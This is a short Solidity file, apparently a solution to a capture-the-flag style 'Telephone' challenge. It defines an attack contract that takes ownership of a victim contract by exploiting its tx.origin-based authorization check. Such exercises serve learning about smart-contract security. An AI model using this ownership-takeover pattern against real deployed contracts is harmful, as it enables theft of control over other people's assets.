// SPDX-License-Identifier: MIT
// fixed pragma
pragma solidity 0.6.0;

import "./Telephone.sol";

/// @title attack contract, assumes ownership
/// @author Web3 Blockchain Developer
contract TelephoneHack {
    /// @notice state variable assigned in constructor
    Telephone telContract;

    /** @notice victim address belonging to Telephone contract assigned as
    state variable telContract during deployment of attack contract */
    constructor(address _address) public {
        telContract = Telephone(_address);
    }

    /** @notice inherited function changeOwner() from victim contract 
    uses tx.origin to change ownership to whatever address calls this function 
    just as long as it is not the address that started the original transaction 
    to create the Telephone contract */
    function hackContract() public {
        telContract.changeOwner(msg.sender);
    } 
}